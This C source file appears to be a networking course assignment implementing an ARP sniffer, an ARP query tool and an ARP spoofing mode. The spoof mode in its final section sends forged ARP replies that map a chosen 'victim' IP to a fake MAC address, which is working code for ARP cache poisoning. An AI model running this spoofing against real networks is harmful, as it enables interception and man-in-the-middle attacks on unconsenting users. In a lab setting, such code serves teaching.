#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "ens33"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */
int main(int argc, char* argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
	
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		if (errno == 1)
			printf("ERROR: You must be root to use this tool!\n");
		else
			perror("open recv socket error");
		exit(1);
	}
	printf("[ ARP sniffer and spoof program ]\n");

/******************************************************************************/
/*__________                  __    ________                                  */
/*\______   \_____  _______ _/  |_  \_____  \    ____    ____                 */
/* |     ___/\__  \ \_  __ \\   __\  /   |   \  /    \ _/ __ \                */
/* |    |     / __ \_|  | \/ |  |   /    |    \|   |  \\  ___/                */
/* |____|    (____  /|__|    |__|   \_______  /|___|  / \___  >               */
/*                \/                        \/      \/      \/                */
/******************************************************************************/
	/*
	 * command: ./arp [-help] | other usage error       
	 */
	if (argc != 3 || strcmp(argv[1], "-help") == 0){
		print_usage();
		close(sockfd_recv);
		exit(1);
	}

    /*
	 * command: ./arp [-l] [-a]
	 *          ./arp [-l] [ip address]
	 */
	else if (strcmp(argv[1], "-l") == 0){
		struct in_addr capture_ip;
		char target_address[INET_ADDRSTRLEN];
		printf("### ARP sniffer mode ###\n");
		if (strcmp(argv[2], "-a") != 0){
            // Convert the target IP in argv[2] to binary format
		    if (inet_pton(AF_INET, argv[2], &capture_ip) != 1) {
			    perror("Invalid IP address");
			    exit(1);
            }
			else
				inet_ntop(AF_INET, &capture_ip, target_address, sizeof(target_address));
		}

		// fork to handle socket loop
		pid_t pid = fork();
		int stat;
		switch(pid){
			case -1:
				perror("fork failed \n");
				exit(1);
			// pid == 0: child proccess
			case 0:
				unsigned char buffer[65536];  // Large buffer to hold the packet
				int saddr_len = sizeof(sa);
				while(1) {
					// Use recvfrom function to get packet.
                    int buflen = recvfrom(sockfd_recv, buffer, sizeof(buffer), 0,
					(struct sockaddr*)&sa, (socklen_t*)&saddr_len);
                    if (buflen < 0) {
                        perror("Failed to receive packets");
                        exit(1);
                    }

                    struct arp_packet *packet = (struct arp_packet *)buffer;
					if (strcmp(argv[2], "-a") == 0)
                    	parse_arp(packet);
					else
						parse_arp_ip(packet, target_address);
				}
				break;
			// pid > 0: parent process
			default:
				// Parent process: Wait for signal (e.g., SIGINT) to clean up
				signal(SIGINT, handler);

				// Wait for the child process to terminate
				wait(&stat);
				// print the status
                if (WIFEXITED(stat))
                    printf("Exit status: %d\n", WEXITSTATUS(stat));
                else if (WIFSIGNALED(stat))
                    psignal(WTERMSIG(stat), "Exit signal");

				close(sockfd_recv);
				printf("socket closed\n");
				exit(0);
		}
	}

	// Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
/******************************************************************************/
/*  __________                __    ___________                               */
/*  \______   \_____ ________/  |_  \__    ___/_  _  ______                   */
/*   |     ___/\__  \\_  __ \   __\   |    |  \ \/ \/ /  _ \                  */
/*   |    |     / __ \|  | \/|  |     |    |   \     (  <_> )                 */
/*   |____|    (____  /__|   |__|     |____|    \/\_/ \____/                  */
/*                  \/                                                        */
/******************************************************************************/
	/*
	 * command: ./arp [-q] [ip address]
	 */
	if (strcmp(argv[1], "-q") == 0){
		struct in_addr query_ip;
		printf("### ARP query mode ###\n");
        // Convert the target IP in argv[2] to binary format
		if (inet_pton(AF_INET, argv[2], &query_ip) != 1) {
			perror("Invalid IP address");
			exit(1);
        }

		/*
		 * Use ioctl function binds the send socket and the Network Interface Card.
         * ioctl( ... )
         */
		strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
		/*
		 * set(get) MAC of the device
		 * operation code SIOCGIFHWADDR: hardware address
		 * destination MAC: FF:FF:FF:FF:FF:FF (Broadcast)
		 */
		char source_mac[6], dest_mac[6];
		if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) < 0) {
            perror("Failed to get MAC address");
            exit(1);
        }
		memcpy(source_mac, req.ifr_hwaddr.sa_data, 6);
		memset(dest_mac, 0xff, 6);
        /*
		 * get IP address of the device
		 * operation code SIOCGIFADDR: address of the device
		 */
		if (ioctl(sockfd_send, SIOCGIFADDR, &req) < 0) {
            perror("Failed to get IP address");
            exit(1);
        }
		myip = ((struct sockaddr_in *)&req.ifr_addr)->sin_addr;
		char source_ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &myip, source_ip, sizeof(source_ip));
        /* 
		 * Build Packet
		 */
		unsigned char buffer[42]; // Buffer for the Ethernet + ARP packet
		struct arp_packet *request_packet = (struct arp_packet *)buffer;
		/*
		 * Ethernet header
		 */
        memcpy(request_packet->eth_hdr.ether_shost, source_mac, 6); // Source MAC
        memcpy(request_packet->eth_hdr.ether_dhost, dest_mac, 6);   // Destination MAC (broadcast)
        request_packet->eth_hdr.ether_type = htons(ETH_P_ARP);      // EtherType: ARP
		/*
		 * ARP header
		 */
		set_sender_hardware_addr(&request_packet->arp, source_mac);    // Source MAC
		set_sender_protocol_addr(&request_packet->arp, source_ip);     // Source IP
		set_target_hardware_addr(&request_packet->arp, dest_mac);      // Dest MAC 
		set_target_protocol_addr(&request_packet->arp, argv[2]);       // Dest IP

		set_hard_type(&request_packet->arp, ARPHRD_ETHER); // Hardware type: Ethernet
        set_prot_type(&request_packet->arp, ETH_P_IP);     // Protocol type: IP
		set_hard_size(&request_packet->arp, 6);    // Hardware address length: 6
		set_prot_size(&request_packet->arp, 4);    // Protocol address length: 4
		set_op_code(&request_packet->arp, ARPOP_REQUEST);  // Operation: ARP request
		// Fill the parameters of the sa.
        sa.sll_ifindex = if_nametoindex(DEVICE_NAME);    // Interface index
		sa.sll_halen = ETH_ALEN;                   // MAC address length
		memcpy(sa.sll_addr, dest_mac, 6);          // Destination MAC (broadcast)

		/*
	     * use sendto function with sa variable to send your packet out
	     * sendto( ... )
	     */
		if (sendto(sockfd_send, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa,
		sizeof(sa)) < 0) {
            perror("Failed to send ARP request");
            exit(1);
        }

        /*
	     * ARP Reply
	     */
        while (1) {
			int buflen = recv(sockfd_send, buffer, sizeof(buffer), 0);
			if (buflen < 0) {
            	perror("Failed to receive packets");
            	exit(1);
        	}
			// Check if it's an ARP reply
			struct arp_packet *reply_packet = (struct arp_packet *)buffer;

			
			if (ntohs(reply_packet->eth_hdr.ether_type) == ETH_P_ARP &&
			    ntohs(reply_packet->arp.ea_hdr.ar_op) == ARPOP_REPLY) {
				char* request_ip = get_sender_protocol_addr(&request_packet->arp);
				char* reply_mac = get_sender_hardware_addr(&reply_packet->arp);
				if (strcmp(request_ip, argv[2]) == 0){
				    printf("MAC address of %s is %s\n", argv[2], reply_mac);
					free(request_ip);
			        free(reply_mac);
					break;
				}
				free(request_ip);
			    free(reply_mac);
			}
		}
	}
/******************************************************************************/
/*__________                __    ___________.__                              */
/*\______   \_____ ________/  |_  \__    ___/|  |_________   ____   ____      */
/* |     ___/\__  \\_  __ \   __\   |    |   |  |  \_  __ \_/ __ \_/ __ \     */
/* |    |     / __ \|  | \/|  |     |    |   |   Y  \  | \/\  ___/\  ___/     */
/* |____|    (____  /__|   |__|     |____|   |___|  /__|    \___  >\___  >    */
/*                \/                              \/            \/     \/     */
/******************************************************************************/
	else {
        struct in_addr victim_ip;
		printf("### ARP spoof mode ###\n");
        // Convert the target IP in argv[2] to binary format
		if (inet_pton(AF_INET, argv[2], &victim_ip) != 1 ) {
			perror("Invalid IP address");
			exit(1);
        }
		// Convert the fake mac in argv[1] to mac format
		// hhx: 8 bit-hex value
	    unsigned char fake_mac[6];
		if (sscanf(argv[1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&fake_mac[0], &fake_mac[1], &fake_mac[2], &fake_mac[3], &fake_mac[4],
		&fake_mac[5]) != 6){
            perror("Invalid MAC address");
			exit(1);
		}

        // Get mac address of the device (see Part2)
		strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
		char source_mac[6];
		if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) < 0) {
            perror("Failed to get MAC address");
            exit(1);
        }
		memcpy(source_mac, req.ifr_hwaddr.sa_data, 6);

        // Fill the parameters of the sa.
		memset(&sa, 0, sizeof(sa));
        sa.sll_ifindex = if_nametoindex(DEVICE_NAME);    // Interface index
		sa.sll_halen = ETH_ALEN;                   // MAC address length
       
	    unsigned char buffer[42]; // Buffer for the ARP packet
	    while(1) {
			// listen to arp request on victim ip
            int buflen = recv(sockfd_recv, buffer, sizeof(buffer), 0);
            if (buflen < 0) {
                perror("Failed to receive packets");
                exit(1);
            }
			// Check if it's an ARP request && it matches victim's IP
			struct arp_packet *request_packet = (struct arp_packet *)buffer;
            if (ntohs(request_packet->eth_hdr.ether_type) == ETH_P_ARP &&
			ntohs(request_packet->arp.ea_hdr.ar_op) == ARPOP_REQUEST &&
			memcmp(request_packet->arp.arp_tpa, &victim_ip, 4) == 0) {
				// print the packet info
				parse_arp_ip(request_packet, argv[2]);

				// Build packet
		        struct arp_packet *reply_packet = (struct arp_packet *)buffer;
				char* dest_mac = get_sender_hardware_addr(&request_packet->arp);
                char* dest_ip = get_sender_protocol_addr(&request_packet->arp);
				/*
				 *  Ethernet header
				 */ 
				memcpy(reply_packet->eth_hdr.ether_dhost, 
				request_packet->eth_hdr.ether_shost, 6);     // Destination: requester's MAC
				memcpy(reply_packet->eth_hdr.ether_shost, source_mac, 6); // Source: our interface MAC
				reply_packet->eth_hdr.ether_type = htons(ETH_P_ARP);  // EtherType: ARP
				/*
				 *  ARP header
				 */ 
				set_sender_hardware_addr(&reply_packet->arp, (char *)fake_mac);    // fake MAC
				set_sender_protocol_addr(&reply_packet->arp, argv[2]);     // request IP
				set_target_hardware_addr(&reply_packet->arp, dest_mac);    // requester MAC 
				set_target_protocol_addr(&reply_packet->arp, dest_ip);     // requester IP

				set_hard_type(&reply_packet->arp, ARPHRD_ETHER); // Hardware type: Ethernet
				set_prot_type(&reply_packet->arp, ETH_P_IP);     // Protocol type: IP
				set_hard_size(&reply_packet->arp, 6);    // Hardware address length: 6
				set_prot_size(&reply_packet->arp, 4);    // Protocol address length: 4
				set_op_code(&reply_packet->arp, ARPOP_REPLY);  // Operation: ARP request
				
				// Send the forged ARP reply
				printf("Sent ARP reply : %s is %s\n", argv[2], argv[1]);
				if (sendto(sockfd_send, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
					perror("Failed to send ARP reply");
					exit(1);
				}
				else{
                    printf("Send successful.\n");
				    break;
				}
				
		    }
	    }
	}
	printf("socket closed\n");
	close(sockfd_send);
	close(sockfd_recv);

	return 0;


}

